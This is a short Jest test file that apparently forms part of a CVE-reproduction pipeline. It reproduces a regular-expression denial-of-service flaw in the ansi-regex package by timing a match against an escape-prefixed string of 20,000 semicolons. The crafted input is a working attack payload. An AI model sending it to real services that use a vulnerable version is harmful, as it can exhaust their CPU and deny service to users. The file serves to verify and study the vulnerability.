// Self-contained ReDoS PoC for adopt-loop / cve pipelines: no require("../utils"),
// so it works after the test file is relocated into the package checkout. jest's
// moduleNameMapper makes require("ansi-regex") resolve to the checkout's source.
test("ReDos in ansi-regex", () => {
  const ansiRegex = require("ansi-regex");
  const measureTime = (f) => {
    const s = process.hrtime();
    f();
    return process.hrtime(s);
  };
  const ESC = String.fromCharCode(0x1b); // , required to enter the pattern
  const attack_str = ESC + "[" + ";".repeat(2 * 10000);
  const t = measureTime(() => {
    ansiRegex().test(attack_str);
  });
  const time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
